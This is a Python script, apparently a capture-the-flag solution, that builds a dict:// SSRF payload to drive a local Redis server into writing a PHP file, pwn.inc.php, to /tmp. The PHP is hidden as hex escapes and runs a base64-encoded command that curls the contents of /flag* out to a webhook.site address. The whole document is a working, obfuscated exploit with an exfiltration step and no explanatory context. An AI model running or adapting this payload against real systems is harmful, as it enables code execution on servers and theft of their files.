import urllib
protocol="dict://"
ip="0x7f.0x00.0x00.0x01"
port="27134"
shell="\x3c\x3f\x70\x68\x70\x20system\x28base64_decode\x28\x27Y3VybCBodHRwczovL3dlYmhvb2suc2l0ZS9hZmI3NzA1Yi02YmM3LTRkZGEtYjQzNy0yNzY5NDAwYzQ0Y2IvJChiYXNlNjQgLXcwIC9mbGFnKik\x27\x29\x29\x3b\x20\x3f\x3e"
filename="pwn.inc.php"
path="/tmp"
passwd=""
cmd=["flushall",
	 "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print(payload)
